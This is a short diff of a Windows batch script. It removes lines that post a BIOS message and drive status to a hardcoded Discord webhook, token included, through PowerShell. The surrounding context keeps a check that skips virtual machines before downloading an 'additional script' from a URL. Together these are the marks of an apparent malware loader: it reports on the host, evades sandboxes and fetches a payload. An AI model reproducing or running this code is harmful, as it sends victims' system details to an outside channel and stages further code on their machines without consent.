@@ -32,15 +32,6 @@ if errorlevel 1 (
     )
 )
 
-:: Send message to Discord webhook
-set "webhook=https://discord.com/api/webhooks/1271866353652994139/sy_qgxuM91892n5SFBX5FUmpbrIbHj5EqTStLQKgtlw9GlTjmNcksTBWLogertgaRNpO"
-powershell -Command "Invoke-RestMethod -Uri '%webhook%' -Method Post -Body (@{content='%message%'} | ConvertTo-Json) -ContentType 'application/json'"
-if errorlevel 1 echo Failed to send BIOS message
-
-:: Send F drive status to Discord webhook
-powershell -Command "Invoke-RestMethod -Uri '%webhook%' -Method Post -Body (@{content='%driveMessage%'} | ConvertTo-Json) -ContentType 'application/json'"
-if errorlevel 1 echo Failed to send drive status
-
 :: Run additional script if not a VM
 if "%isVM%"=="false" (
     :: Define the URL of the file and the destination path
